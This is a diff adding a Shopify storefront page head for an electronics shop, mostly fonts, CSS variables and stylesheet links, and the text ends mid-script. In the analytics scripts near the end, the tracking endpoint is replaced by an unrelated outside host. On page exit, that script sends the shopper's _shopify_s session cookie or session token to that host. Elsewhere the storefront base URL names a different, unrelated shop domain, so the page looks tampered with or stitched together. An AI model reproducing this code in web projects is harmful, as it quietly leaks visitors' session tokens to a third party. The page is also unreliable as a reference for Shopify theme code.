+            src: url("//www.istudiosg.com/cdn/shop/t/14/assets/fa-solid-900.woff2?v=118991557498766039071742784889") format("woff2"), url("//www.istudiosg.com/cdn/shop/t/14/assets/fa-solid-900.ttf?v=11227793290438786691742784887") format("truetype");
+        }
+
+        @font-face {
+            font-family: 'Font Awesome 6 Brands';
+            font-style: normal;
+            font-weight: 400;
+            font-display: block;
+            src: url("//www.istudiosg.com/cdn/shop/t/14/assets/fa-brands-400.woff2?2866") format("woff2"), url("  //www.istudiosg.com/cdn/shop/t/14/assets/fa-brands-400.ttf?2866") format("truetype");
+        }
+    </style>
+    <style data-shopify>
+        @font-face {
+            font-family: Assistant;
+            font-weight: 400;
+            font-style: normal;
+            font-display: swap;
+            src: url("//www.istudiosg.com/cdn/fonts/assistant/assistant_n4.9120912a469cad1cc292572851508ca49d12e768.woff2?h1=aXN0dWRpby1lbHVzaC1wcm9kdWN0aW9uLmFjY291bnQubXlzaG9waWZ5LmNvbQ&h2=aXN0dWRpb3NnLmNvbQ&hmac=f08b4c8dad363a51140f208e167805f634db94adbbb3544a6fbd71c32b1ebc6f") format("woff2"),
+                url("//www.istudiosg.com/cdn/fonts/assistant/assistant_n4.6e9875ce64e0fefcd3f4446b7ec9036b3ddd2985.woff?h1=aXN0dWRpby1lbHVzaC1wcm9kdWN0aW9uLmFjY291bnQubXlzaG9waWZ5LmNvbQ&h2=aXN0dWRpb3NnLmNvbQ&hmac=04204526227e0d14a011b44f621eed958a37dd24ff228dec608fad5ba3714e53") format("woff");
+        }
+
+        @font-face {
+            font-family: Assistant;
+            font-weight: 700;
+            font-style: normal;
+            font-display: swap;
+            src: url("//www.istudiosg.com/cdn/fonts/assistant/assistant_n7.bf44452348ec8b8efa3aa3068825305886b1c83c.woff2?h1=aXN0dWRpby1lbHVzaC1wcm9kdWN0aW9uLmFjY291bnQubXlzaG9waWZ5LmNvbQ&h2=aXN0dWRpb3NnLmNvbQ&hmac=3eb98cb4f0f5b11a3f34feed0aa554dd621b127bc1cbc141c68703f90e8e42d3") format("woff2"),
+                url("//www.istudiosg.com/cdn/fonts/assistant/assistant_n7.0c887fee83f6b3bda822f1150b912c72da0f7b64.woff?h1=aXN0dWRpby1lbHVzaC1wcm9kdWN0aW9uLmFjY291bnQubXlzaG9waWZ5LmNvbQ&h2=aXN0dWRpb3NnLmNvbQ&hmac=d0e65006948e80adf21a0472f7da1fee501e61f043b62e661027b9eeb582385b") format("woff");
+        }
+
+
+
+        @font-face {
+            font-family: Assistant;
+            font-weight: 400;
+            font-style: normal;
+            font-display: swap;
+            src: url("//www.istudiosg.com/cdn/fonts/assistant/assistant_n4.9120912a469cad1cc292572851508ca49d12e768.woff2?h1=aXN0dWRpby1lbHVzaC1wcm9kdWN0aW9uLmFjY291bnQubXlzaG9waWZ5LmNvbQ&h2=aXN0dWRpb3NnLmNvbQ&hmac=f08b4c8dad363a51140f208e167805f634db94adbbb3544a6fbd71c32b1ebc6f") format("woff2"),
+                url("//www.istudiosg.com/cdn/fonts/assistant/assistant_n4.6e9875ce64e0fefcd3f4446b7ec9036b3ddd2985.woff?h1=aXN0dWRpby1lbHVzaC1wcm9kdWN0aW9uLmFjY291bnQubXlzaG9waWZ5LmNvbQ&h2=aXN0dWRpb3NnLmNvbQ&hmac=04204526227e0d14a011b44f621eed958a37dd24ff228dec608fad5ba3714e53") format("woff");
+        }
+
+
+
+        :root,
+        .color-background-1 {
+            --color-background: 255, 255, 255;
+
+            --gradient-background: #ffffff59;
+
+            --color-foreground: 18, 18, 18;
+            --color-shadow: 18, 18, 18;
+            --color-button: 0, 113, 227;
+            --color-button-text: 255, 255, 255;
+            --color-secondary-button: 255, 255, 255;
+            --color-secondary-button-text: 18, 18, 18;
+            --color-link: 18, 18, 18;
+            --color-badge-foreground: 18, 18, 18;
+            --color-badge-background: 255, 255, 255;
+            --color-badge-border: 18, 18, 18;
+            --payment-terms-background-color: rgb(255, 255, 255);
+        }
+
+
+        .color-background-2 {
+            --color-background: 243, 243, 243;
+
+            --gradient-background: #f3f3f3;
+
+            --color-foreground: 18, 18, 18;
+            --color-shadow: 18, 18, 18;
+
+            --color-button: 18, 18, 18;
+            --color-button-text: 243, 243, 243;
+            --color-secondary-button: 243, 243, 243;
+            --color-secondary-button-text: 18, 18, 18;
+            --color-link: 18, 18, 18;
+            --color-badge-foreground: 18, 18, 18;
+            --color-badge-background: 243, 243, 243;
+            --color-badge-border: 18, 18, 18;
+            --payment-terms-background-color: rgb(243 243 243);
+        }
+
+
+        .color-inverse {
+            --color-background: 36, 40, 51;
+
+            --gradient-background: #242833;
+
+            --color-foreground: 255, 255, 255;
+            --color-shadow: 18, 18, 18;
+            --color-button: 255, 255, 255;
+            --color-button-text: 0, 0, 0;
+            --color-secondary-button: 36, 40, 51;
+            --color-secondary-button-text: 255, 255, 255;
+            --color-link: 255, 255, 255;
+            --color-badge-foreground: 255, 255, 255;
+            --color-badge-background: 36, 40, 51;
+            --color-badge-border: 255, 255, 255;
+            --payment-terms-background-color: rgb(36 40 51);
+        }
+
+
+        .color-accent-1 {
+            --color-background: 18, 18, 18;
+
+            --gradient-background: #121212;
+
+            --color-foreground: 255, 255, 255;
+            --color-shadow: 18, 18, 18;
+            --color-button: 255, 255, 255;
+            --color-button-text: 18, 18, 18;
+            --color-secondary-button: 18, 18, 18;
+            --color-secondary-button-text: 255, 255, 255;
+            --color-link: 255, 255, 255;
+            --color-badge-foreground: 255, 255, 255;
+            --color-badge-background: 18, 18, 18;
+            --color-badge-border: 255, 255, 255;
+            --payment-terms-background-color: rgb(18 18 18);
+        }
+
+
+        .color-accent-2 {
+            --color-background: 51, 79, 180;
+
+            --gradient-background: #000000;
+
+            --color-foreground: 255, 255, 255;
+            --color-shadow: 18, 18, 18;
+            --color-button: 255, 255, 255;
+            --color-button-text: 51, 79, 180;
+            --color-secondary-button: 51, 79, 180;
+            --color-secondary-button-text: 255, 255, 255;
+            --color-link: 255, 255, 255;
+            --color-badge-foreground: 255, 255, 255;
+            --color-badge-background: 51, 79, 180;
+            --color-badge-border: 255, 255, 255;
+            --payment-terms-background-color: rgb(51 79 180);
+        }
+
+
+        .color-scheme-ac1f97d9-2391-4261-b2e4-e6912b28bacf {
+            --color-background: 0, 0, 0;
+
+            --gradient-background: rgba(0, 0, 0, 0);
+
+            --color-foreground: 255, 255, 255;
+            --color-shadow: 18, 18, 18;
+            --color-button: 0, 113, 227;
+            --color-button-text: 255, 255, 255;
+            --color-secondary-button: 0, 0, 0;
+            --color-secondary-button-text: 18, 18, 18;
+            --color-link: 18, 18, 18;
+            --color-badge-foreground: 255, 255, 255;
+            --color-badge-background: 0, 0, 0;
+            --color-badge-border: 255, 255, 255;
+            --payment-terms-background-color: rgb(0 0 0);
+        }
+
+
+        body,
+        .color-background-1,
+        .color-background-2,
+        .color-inverse,
+        .color-accent-1,
+        .color-accent-2,
+        .color-scheme-ac1f97d9-2391-4261-b2e4-e6912b28bacf {
+            color: rgba(var(--color-foreground), 0.75);
+            background-color: #000;
+        }
+
+        :root {
+            --font-body-family: Assistant, sans-serif;
+            --font-body-style: normal;
+            --font-body-weight: 400;
+            --font-body-weight-bold: 700;
+
+            --font-heading-family: Assistant, sans-serif;
+            --font-heading-style: normal;
+            --font-heading-weight: 400;
+
+            --font-body-scale: 1.0;
+            --font-heading-scale: 1.0;
+
+            --media-padding: px;
+            --media-border-opacity: 0.05;
+            --media-border-width: 1px;
+            --media-radius: 0px;
+            --media-shadow-opacity: 0.0;
+            --media-shadow-horizontal-offset: 0px;
+            --media-shadow-vertical-offset: 0px;
+            --media-shadow-blur-radius: 0px;
+            --media-shadow-visible: 0;
+
+            --page-width: 120rem;
+            --page-width-margin: 0rem;
+
+            --product-card-image-padding: 0.0rem;
+            --product-card-corner-radius: 0.0rem;
+            --product-card-text-alignment: left;
+            --product-card-border-width: 0.0rem;
+            --product-card-border-opacity: 0.0;
+            --product-card-shadow-opacity: 0.1;
+            --product-card-shadow-visible: 1;
+            --product-card-shadow-horizontal-offset: 0.0rem;
+            --product-card-shadow-vertical-offset: 0.0rem;
+            --product-card-shadow-blur-radius: 0.0rem;
+
+            --collection-card-image-padding: 0.0rem;
+            --collection-card-corner-radius: 0.0rem;
+            --collection-card-text-alignment: left;
+            --collection-card-border-width: 0.0rem;
+            --collection-card-border-opacity: 0.0;
+            --collection-card-shadow-opacity: 0.1;
+            --collection-card-shadow-visible: 1;
+            --collection-card-shadow-horizontal-offset: 0.0rem;
+            --collection-card-shadow-vertical-offset: 0.0rem;
+            --collection-card-shadow-blur-radius: 0.0rem;
+
+            --blog-card-image-padding: 0.0rem;
+            --blog-card-corner-radius: 0.0rem;
+            --blog-card-text-alignment: left;
+            --blog-card-border-width: 0.0rem;
+            --blog-card-border-opacity: 0.1;
+            --blog-card-shadow-opacity: 0.0;
+            --blog-card-shadow-visible: 0;
+            --blog-card-shadow-horizontal-offset: 0.0rem;
+            --blog-card-shadow-vertical-offset: 0.4rem;
+            --blog-card-shadow-blur-radius: 0.5rem;
+
+            --badge-corner-radius: 4.0rem;
+
+            --popup-border-width: 1px;
+            --popup-border-opacity: 0.1;
+            --popup-corner-radius: 0px;
+            --popup-shadow-opacity: 0.0;
+            --popup-shadow-horizontal-offset: 0px;
+            --popup-shadow-vertical-offset: 0px;
+            --popup-shadow-blur-radius: 0px;
+
+            --drawer-border-width: 1px;
+            --drawer-border-opacity: 0.1;
+            --drawer-shadow-opacity: 0.0;
+            --drawer-shadow-horizontal-offset: 0px;
+            --drawer-shadow-vertical-offset: 0px;
+            --drawer-shadow-blur-radius: 0px;
+
+            --spacing-sections-desktop: 0px;
+            --spacing-sections-mobile: 0px;
+
+            --grid-desktop-vertical-spacing: 8px;
+            --grid-desktop-horizontal-spacing: 8px;
+            --grid-mobile-vertical-spacing: 4px;
+            --grid-mobile-horizontal-spacing: 4px;
+
+            --text-boxes-border-opacity: 1.0;
+            --text-boxes-border-width: 0px;
+            --text-boxes-radius: 0px;
+            --text-boxes-shadow-opacity: 0.0;
+            --text-boxes-shadow-visible: 0;
+            --text-boxes-shadow-horizontal-offset: 0px;
+            --text-boxes-shadow-vertical-offset: 0px;
+            --text-boxes-shadow-blur-radius: 0px;
+
+            --buttons-radius: 40px;
+            --buttons-radius-outset: 42px;
+            --buttons-border-width: 2px;
+            --buttons-border-opacity: 0.4;
+            --buttons-shadow-opacity: 0.0;
+            --buttons-shadow-visible: 0;
+            --buttons-shadow-horizontal-offset: 0px;
+            --buttons-shadow-vertical-offset: 0px;
+            --buttons-shadow-blur-radius: 0px;
+            --buttons-border-offset: 0.3px;
+
+            --inputs-radius: 4px;
+            --inputs-border-width: 1px;
+            --inputs-border-opacity: 0.55;
+            --inputs-shadow-opacity: 0.0;
+            --inputs-shadow-horizontal-offset: 0px;
+            --inputs-margin-offset: 0px;
+            --inputs-shadow-vertical-offset: 0px;
+            --inputs-shadow-blur-radius: 0px;
+            --inputs-radius-outset: 5px;
+
+            --variant-pills-radius: 6px;
+            --variant-pills-border-width: 1px;
+            --variant-pills-border-opacity: 0.2;
+            --variant-pills-shadow-opacity: 0.0;
+            --variant-pills-shadow-horizontal-offset: -4px;
+            --variant-pills-shadow-vertical-offset: 0px;
+            --variant-pills-shadow-blur-radius: 0px;
+
+
+            --font-body-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont;
+            --font-body-style: normal;
+            --font-body-weight: 400;
+
+            --font-heading-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont;
+            --font-heading-style: normal;
+            --font-heading-weight: 400;
+            --font-body-scale: 1.0;
+            --font-heading-scale: 1.0;
+
+            --color-base-text: 18, 18, 18;
+            --color-shadow: 18, 18, 18;
+            --color-base-background-1: 255, 255, 255;
+            --color-base-background-2: 255, 255, 255;
+            --color-base-solid-button-labels: 255, 255, 255;
+            --color-base-outline-button-labels: 18, 18, 18;
+            --color-base-accent-1: 0, 113, 227;
+            --color-base-accent-2: 51, 79, 180;
+            --payment-terms-background-color: #FFFFFF;
+
+            --gradient-base-background-1: #FFFFFF;
+            --gradient-base-background-2: #FFFFFF;
+            --gradient-base-accent-1: #ff9900;
+            --gradient-base-accent-2: #334FB4;
+
+            --media-padding: px;
+            --media-border-opacity: 0.05;
+            --media-border-width: 1px;
+            --media-radius: 0px;
+            --media-shadow-opacity: 0.0;
+            --media-shadow-horizontal-offset: 0px;
+            --media-shadow-vertical-offset: 0px;
+            --media-shadow-blur-radius: 0px;
+
+            --page-width: 120rem;
+            --page-width-margin: 0rem;
+
+            --card-image-padding: 0.0rem;
+            --card-corner-radius: 0.0rem;
+            --card-text-alignment: left;
+            --card-border-width: 0.0rem;
+            --card-border-opacity: 0.0;
+            --card-shadow-opacity: 0.1;
+            --card-shadow-horizontal-offset: 0.0rem;
+            --card-shadow-vertical-offset: 0.0rem;
+            --card-shadow-blur-radius: 0.0rem;
+
+            --badge-corner-radius: 4.0rem;
+
+            --popup-border-width: 1px;
+            --popup-border-opacity: 0.1;
+            --popup-corner-radius: 0px;
+            --popup-shadow-opacity: 0.0;
+            --popup-shadow-horizontal-offset: 0px;
+            --popup-shadow-vertical-offset: 0px;
+            --popup-shadow-blur-radius: 0px;
+
+            --drawer-border-width: 1px;
+            --drawer-border-opacity: 0.1;
+            --drawer-shadow-opacity: 0.0;
+            --drawer-shadow-horizontal-offset: 0px;
+            --drawer-shadow-vertical-offset: 0px;
+            --drawer-shadow-blur-radius: 0px;
+
+            --spacing-sections-desktop: 0px;
+            --spacing-sections-mobile: 0px;
+
+            --grid-desktop-vertical-spacing: 8px;
+            --grid-desktop-horizontal-spacing: 8px;
+            --grid-mobile-vertical-spacing: 4px;
+            --grid-mobile-horizontal-spacing: 4px;
+
+            --text-boxes-border-opacity: 1.0;
+            --text-boxes-border-width: 0px;
+            --text-boxes-radius: 0px;
+            --text-boxes-shadow-opacity: 0.0;
+            --text-boxes-shadow-horizontal-offset: 0px;
+            --text-boxes-shadow-vertical-offset: 0px;
+            --text-boxes-shadow-blur-radius: 0px;
+
+            --buttons-radius: 40px;
+            --buttons-radius-outset: 42px;
+            --buttons-border-width: 2px;
+            --buttons-border-opacity: 0.4;
+            --buttons-shadow-opacity: 0.0;
+            --buttons-shadow-horizontal-offset: 0px;
+            --buttons-shadow-vertical-offset: 0px;
+            --buttons-shadow-blur-radius: 0px;
+            --buttons-border-offset: 0.3px;
+
+            --inputs-radius: 4px;
+            --inputs-border-width: 1px;
+            --inputs-border-opacity: 0.55;
+            --inputs-shadow-opacity: 0.0;
+            --inputs-shadow-horizontal-offset: 0px;
+            --inputs-margin-offset: 0px;
+            --inputs-shadow-vertical-offset: 0px;
+            --inputs-shadow-blur-radius: 0px;
+            --inputs-radius-outset: 5px;
+
+            --variant-pills-radius: 6px;
+            --variant-pills-border-width: 1px;
+            --variant-pills-border-opacity: 0.2;
+            --variant-pills-shadow-opacity: 0.0;
+            --variant-pills-shadow-horizontal-offset: -4px;
+            --variant-pills-shadow-vertical-offset: 0px;
+            --variant-pills-shadow-blur-radius: 0px;
+
+            --color-primary-bt-bg: #ff9900;
+            --color-primary-bt-label: #FFFFFF;
+            --color-primary-bt-outline: #ff9900;
+            --color-primary-bt-hover: #62bbfa;
+            --color-secondary-bt-bg: transparent;
+            --color-secondary-bt-label: #ff9900;
+            --color-secondary-bt-outline: #ff9900;
+            --color-secondary-bt-hover: #62bbfa;
+
+
+            --color-link-dynamic-label: #ff9900;
+            --color-link-dynamic-hover: #62bbfa;
+
+
+            --color-tertiary-dynamic-label: #ff9900;
+            --color-tertiary-dynamic-hover: #62bbfa;
+
+        }
+
+        *,
+        *::before,
+        *::after {
+            box-sizing: inherit;
+        }
+
+        html {
+            box-sizing: border-box;
+            font-size: calc(var(--font-body-scale) * 62.5%);
+            height: 100%;
+        }
+
+        body {
+            min-height: 100%;
+            margin: 0;
+            font-size: 1.5rem;
+            letter-spacing: 0.06rem;
+            line-height: calc(1 + 0.8 / var(--font-body-scale));
+            font-family: var(--font-body-family);
+            font-style: var(--font-body-style);
+            font-weight: var(--font-body-weight);
+            -webkit-font-smoothing: antialiased;
+            background-color: #252525 !important;
+        }
+
+        body:has(.shopify-section-group-footer-group) {
+            display: grid;
+            grid-template-rows: auto auto 1fr auto;
+            grid-template-columns: 100%;
+        }
+
+        @media screen and (min-width: 750px) {
+            body {
+                font-size: 1.6rem;
+            }
+        }
+    </style>
+
+    <link href="//www.istudiosg.com/cdn/shop/t/14/assets/base.css?v=127241086646799884071742784889" rel="stylesheet"
+        type="text/css" media="all" />
+
+
+    <link rel="preload" as="font"
+        href="//www.istudiosg.com/cdn/fonts/assistant/assistant_n4.9120912a469cad1cc292572851508ca49d12e768.woff2?h1=aXN0dWRpby1lbHVzaC1wcm9kdWN0aW9uLmFjY291bnQubXlzaG9waWZ5LmNvbQ&h2=aXN0dWRpb3NnLmNvbQ&hmac=f08b4c8dad363a51140f208e167805f634db94adbbb3544a6fbd71c32b1ebc6f"
+        type="font/woff2" crossorigin>
+    <link rel="preload" as="font"
+        href="//www.istudiosg.com/cdn/fonts/assistant/assistant_n4.9120912a469cad1cc292572851508ca49d12e768.woff2?h1=aXN0dWRpby1lbHVzaC1wcm9kdWN0aW9uLmFjY291bnQubXlzaG9waWZ5LmNvbQ&h2=aXN0dWRpb3NnLmNvbQ&hmac=f08b4c8dad363a51140f208e167805f634db94adbbb3544a6fbd71c32b1ebc6f"
+        type="font/woff2" crossorigin>
+    <link rel="stylesheet"
+        href="//www.istudiosg.com/cdn/shop/t/14/assets/component-predictive-search.css?v=91813212418334334851742784888"
+        media="print" onload="this.media='all'">
+    <script>
+        document.documentElement.className = document.documentElement.className.replace('no-js', 'js');
+        if (Shopify.designMode) {
+            document.documentElement.classList.add('shopify-design-mode');
+        }
+        const vat_free_day = false;
+
+        const vat_discount_amount = 20.0;
+
+
+        const vat_free_quantity = "3";
+
+
+        const vat_free_message = "Cannot add more than 3 VAT-exempt products to the shopping cart";
+
+
+        const not_available_message = "Not Available";
+
+
+        const quantity_limit_error_message = "Sorry! you reached maximum limit for this product!";
+
+    </script>
+    <link rel="stylesheet"
+        href="//www.istudiosg.com/cdn/shop/t/14/assets/component-card.css?v=111081949408356567601742784889"
+        media="print" onload="this.media='all'">
+    <link rel="stylesheet"
+        href="//www.istudiosg.com/cdn/shop/t/14/assets/component-price.css?v=89212854351592844731742784887"
+        media="print" onload="this.media='all'">
+    <link rel="stylesheet"
+        href="//www.istudiosg.com/cdn/shop/t/14/assets/section-product-recommendations.css?v=49786085183541529781742784888"
+        media="print" onload="this.media='all'">
+    <link rel="stylesheet"
+        href="//www.istudiosg.com/cdn/shop/t/14/assets/slick-theme.css?v=155861180100014643231742784887" media="print"
+        onload="this.media='all'">
+    <link rel="stylesheet"
+        href="//www.istudiosg.com/cdn/shop/t/14/assets/slick-theme-min.css?v=86793612638635186001742784889"
+        media="print" onload="this.media='all'">
+
+    <noscript>
+        <link href="//www.istudiosg.com/cdn/shop/t/14/assets/component-price.css?v=89212854351592844731742784887"
+            rel="stylesheet" type="text/css" media="all" />
+    </noscript>
+    <noscript>
+        <link
+            href="//www.istudiosg.com/cdn/shop/t/14/assets/section-product-recommendations.css?v=49786085183541529781742784888"
+            rel="stylesheet" type="text/css" media="all" />
+    </noscript>
+
+    <link rel="stylesheet"
+        href="//www.istudiosg.com/cdn/shop/t/14/assets/product-scratch.css?v=179858087556892581742784887" media="print"
+        onload="this.media='all'">
+    <link rel="stylesheet"
+        href="//www.istudiosg.com/cdn/shop/t/14/assets/product-collection-carousel.css?v=15060387450964793051742784888"
+        media="print" onload="this.media='all'">
+    <link rel="stylesheet"
+        href="//www.istudiosg.com/cdn/shop/t/14/assets/component-rating.css?v=157771854592137137841742784889"
+        media="print" onload="this.media='all'">
+    <script src="//www.istudiosg.com/cdn/shop/t/14/assets/product-model.js?v=56285008796734381901742784888"
+        defer></script>
+
+    <link href="//www.istudiosg.com/cdn/shop/t/14/assets/ac-modal.min.css?v=15722724579182767671742784888"
+        rel="stylesheet" type="text/css" media="all" />
+    <link href="//www.istudiosg.com/cdn/shop/t/14/assets/ac-modal-custom.css?v=17302321221102055051742784887"
+        rel="stylesheet" type="text/css" media="all" />
+    <link rel="stylesheet"
+        href="//www.istudiosg.com/cdn/shop/t/14/assets/ac-modal-custom.css?v=17302321221102055051742784887"
+        media="print" onload="this.media='all'">
+    <link rel="stylesheet"
+        href="//www.istudiosg.com/cdn/shop/t/14/assets/component-apple-care-modal.css?v=72539108787457179491742784889"
+        media="print" onload="this.media='all'">
+    <link rel="stylesheet"
+        href="//www.istudiosg.com/cdn/shop/t/14/assets/fontawesome.min.css?v=137756382566111518581742784888"
+        media="print" onload="this.media='all'">
+
+    <link
+        href="//www.istudiosg.com/cdn/shop/t/14/assets/component-pickup-availability.css?v=126759165165079086151742784888"
+        rel="stylesheet" type="text/css" media="all" />
+    <script src="//www.istudiosg.com/cdn/shop/t/14/assets/pickup-availability.js?v=741939373213593171742784889"
+        defer="defer"></script>
+    <link href="https:\/www.stevefortexas.com/about/" rel="dns-prefetch">
+    <script>(function () { if ("sendBeacon" in navigator && "performance" in window) { try { var session_token_from_headers = performance.getEntriesByType('navigation')[0].serverTiming.find(x => x.name == '_s').description; } catch { var session_token_from_headers = undefined; } var session_cookie_matches = document.cookie.match(/_shopify_s=([^;]*)/); var session_token_from_cookie = session_cookie_matches && session_cookie_matches.length === 2 ? session_cookie_matches[1] : ""; var session_token = session_token_from_headers || session_token_from_cookie || ""; function handle_abandonment_event(e) { var entries = performance.getEntries().filter(function (entry) { return /www.stevefortexas.com/about/.test(entry.name); }); if (!window.abandonment_tracked && entries.length === 0) { window.abandonment_tracked = true; var currentMs = Date.now(); var navigation_start = performance.timing.navigationStart; var payload = { shop_id: 63738642612, url: window.location.href, navigation_start, duration: currentMs - navigation_start, session_token, page_type: "product" }; window.navigator.sendBeacon("https:\/www.stevefortexas.com/about/", JSON.stringify({ schema_id: "online_store_buyer_site_abandonment/1.1", payload: payload, metadata: { event_created_at_ms: currentMs, event_sent_at_ms: currentMs } })); } } window.addEventListener('pagehide', handle_abandonment_event); } }());</script>
+    <script
+        id="web-pixels-manager-setup">(function e(e, d, r, n, o) { if (void 0 === o && (o = {}), !Boolean(null === (a = null === (i = window.Shopify) || void 0 === i ? void 0 : i.analytics) || void 0 === a ? void 0 : a.replayQueue)) { var i, a; window.Shopify = window.Shopify || {}; var t = window.Shopify; t.analytics = t.analytics || {}; var s = t.analytics; s.replayQueue = [], s.publish = function (e, d, r) { return s.replayQueue.push([e, d, r]), !0 }; try { self.performance.mark("wpm:start") } catch (e) { } var l = function () { var e = { modern: /Edge?\/(1{2}[4-9]|1[2-9]\d|[2-9]\d{2}|\d{4,})\.\d+(\.\d+|)|Firefox\/(1{2}[4-9]|1[2-9]\d|[2-9]\d{2}|\d{4,})\.\d+(\.\d+|)|Chrom(ium|e)\/(9{2}|\d{3,})\.\d+(\.\d+|)|(Maci|X1{2}).+ Version\/(15\.\d+|(1[6-9]|[2-9]\d|\d{3,})\.\d+)([,.]\d+|)( \(\w+\)|)( Mobile\/\w+|) Safari\/|Chrome.+OPR\/(9{2}|\d{3,})\.\d+\.\d+|(CPU[ +]OS|iPhone[ +]OS|CPU[ +]iPhone|CPU IPhone OS|CPU iPad OS)[ +]+(15[._]\d+|(1[6-9]|[2-9]\d|\d{3,})[._]\d+)([._]\d+|)|Android:?[ /-](13[3-9]|1[4-9]\d|[2-9]\d{2}|\d{4,})(\.\d+|)(\.\d+|)|Android.+Firefox\/(13[5-9]|1[4-9]\d|[2-9]\d{2}|\d{4,})\.\d+(\.\d+|)|Android.+Chrom(ium|e)\/(13[3-9]|1[4-9]\d|[2-9]\d{2}|\d{4,})\.\d+(\.\d+|)|SamsungBrowser\/([2-9]\d|\d{3,})\.\d+/, legacy: /Edge?\/(1[6-9]|[2-9]\d|\d{3,})\.\d+(\.\d+|)|Firefox\/(5[4-9]|[6-9]\d|\d{3,})\.\d+(\.\d+|)|Chrom(ium|e)\/(5[1-9]|[6-9]\d|\d{3,})\.\d+(\.\d+|)([\d.]+$|.*Safari\/(?![\d.]+ Edge\/[\d.]+$))|(Maci|X1{2}).+ Version\/(10\.\d+|(1[1-9]|[2-9]\d|\d{3,})\.\d+)([,.]\d+|)( \(\w+\)|)( Mobile\/\w+|) Safari\/|Chrome.+OPR\/(3[89]|[4-9]\d|\d{3,})\.\d+\.\d+|(CPU[ +]OS|iPhone[ +]OS|CPU[ +]iPhone|CPU IPhone OS|CPU iPad OS)[ +]+(10[._]\d+|(1[1-9]|[2-9]\d|\d{3,})[._]\d+)([._]\d+|)|Android:?[ /-](13[3-9]|1[4-9]\d|[2-9]\d{2}|\d{4,})(\.\d+|)(\.\d+|)|Mobile Safari.+OPR\/([89]\d|\d{3,})\.\d+\.\d+|Android.+Firefox\/(13[5-9]|1[4-9]\d|[2-9]\d{2}|\d{4,})\.\d+(\.\d+|)|Android.+Chrom(ium|e)\/(13[3-9]|1[4-9]\d|[2-9]\d{2}|\d{4,})\.\d+(\.\d+|)|Android.+(UC? ?Browser|UCWEB|U3)[ /]?(15\.([5-9]|\d{2,})|(1[6-9]|[2-9]\d|\d{3,})\.\d+)\.\d+|SamsungBrowser\/(5\.\d+|([6-9]|\d{2,})\.\d+)|Android.+MQ{2}Browser\/(14(\.(9|\d{2,})|)|(1[5-9]|[2-9]\d|\d{3,})(\.\d+|))(\.\d+|)|K[Aa][Ii]OS\/(3\.\d+|([4-9]|\d{2,})\.\d+)(\.\d+|)/ }, d = e.modern, r = e.legacy, n = navigator.userAgent; return n.match(d) ? "modern" : n.match(r) ? "legacy" : "unknown" }(), u = "modern" === l ? "modern" : "legacy", c = (null != n ? n : { modern: "", legacy: "" })[u], f = function (e) { return [e.baseUrl, "/wpm", "/b", e.hashVersion, "modern" === e.buildTarget ? "m" : "l", ".js"].join("") }({ baseUrl: d, hashVersion: r, buildTarget: u }), m = function (e) { var d = e.version, r = e.bundleTarget, n = e.surface, o = e.pageUrl, i = e.monorailEndpoint; return { emit: function (e) { var a = e.status, t = e.errorMsg, s = (new Date).getTime(), l = JSON.stringify({ metadata: { event_sent_at_ms: s }, events: [{ schema_id: "web_pixels_manager_load/3.1", payload: { version: d, bundle_target: r, page_url: o, status: a, surface: n, error_msg: t }, metadata: { event_created_at_ms: s } }] }); if (!i) return console && console.warn && console.warn("[Web Pixels Manager] No Monorail endpoint provided, skipping logging."), !1; try { return self.navigator.sendBeacon.bind(self.navigator)(i, l) } catch (e) { } var u = new XMLHttpRequest; try { return u.open("POST", i, !0), u.setRequestHeader("Content-Type", "text/plain"), u.send(l), !0 } catch (e) { return console && console.warn && console.warn("[Web Pixels Manager] Got an unhandled error while logging to Monorail."), !1 } } } }({ version: r, bundleTarget: l, surface: e.surface, pageUrl: self.location.href, monorailEndpoint: e.monorailEndpoint }); try { o.browserTarget = l, function (e) { var d = e.src, r = e.async, n = void 0 === r || r, o = e.onload, i = e.onerror, a = e.sri, t = e.scriptDataAttributes, s = void 0 === t ? {} : t, l = document.createElement("script"), u = document.querySelector("head"), c = document.querySelector("body"); if (l.async = n, l.src = d, a && (l.integrity = a, l.crossOrigin = "anonymous"), s) for (var f in s) if (Object.prototype.hasOwnProperty.call(s, f)) try { l.dataset[f] = s[f] } catch (e) { } if (o && l.addEventListener("load", o), i && l.addEventListener("error", i), u) u.appendChild(l); else { if (!c) throw new Error("Did not find a head or body element to append the script"); c.appendChild(l) } }({ src: f, async: !0, onload: function () { if (!function () { var e, d; return Boolean(null === (d = null === (e = window.Shopify) || void 0 === e ? void 0 : e.analytics) || void 0 === d ? void 0 : d.initialized) }()) { var d = window.webPixelsManager.init(e) || void 0; if (d) { var r = window.Shopify.analytics; r.replayQueue.forEach((function (e) { var r = e[0], n = e[1], o = e[2]; d.publishCustomEvent(r, n, o) })), r.replayQueue = [], r.publish = d.publishCustomEvent, r.visitor = d.visitor, r.initialized = !0 } } }, onerror: function () { return m.emit({ status: "failed", errorMsg: "".concat(f, " has failed to load") }) }, sri: function (e) { var d = /^sha384-[A-Za-z0-9+/=]+$/; return "string" == typeof e && d.test(e) }(c) ? c : "", scriptDataAttributes: o }), m.emit({ status: "loading" }) } catch (e) { m.emit({ status: "failed", errorMsg: (null == e ? void 0 : e.message) || "Unknown error" }) } } })({ shopId: 63738642612, storefrontBaseUrl: "https://tunari-online.ro/", extensionsBaseUrl: "https://extensions.shopifycdn.com/cdn/shopifycloud/web-pixels-manager", monorailEndpoint: "https:\/www.stevefortexas.com/about/", surface: "storefront-renderer", enabledBetaFlags: ["ac843a20"], webPixelsConfigList: [{ "id": "440205492", "configuration": "{\"config\":\"{\\\"google_tag_ids\\\":[\\\"GT-P8RCB3SH\\\"],\\\"target_country\\\":\\\"SG\\\",\\\"gtag_events\\\":[{\\\"type\\\":\\\"view_item\\\",\\\"action_label\\\":\\\"MC-7SRS2D91NR\\\"},{\\\"type\\\":\\\"purchase\\\",\\\"action_label\\\":\\\"MC-7SRS2D91NR\\\"},{\\\"type\\\":\\\"page_view\\\",\\\"action_label\\\":\\\"MC-7SRS2D91NR\\\"}],\\\"enable_monitoring_mode\\\":false}\"}", "eventPayloadVersion": "v1", "runtimeContext": "OPEN", "scriptVersion": "b2a88bafab3e21179ed38636efcd8a93", "type": "APP", "apiClientId": 1780363, "privacyPurposes": [] }, { "id": "154108084", "configuration": "{\"pixel_id\":\"964293195365224\",\"pixel_type\":\"facebook_pixel\",\"metaapp_system_user_token\":\"-\"}", "eventPayloadVersion": "v1", "runtimeContext": "OPEN", "scriptVersion": "6d8c3ef0426b37b2a9b717daeb719f58", "type": "APP", "apiClientId": 2329312, "privacyPurposes": ["ANALYTICS", "MARKETING", 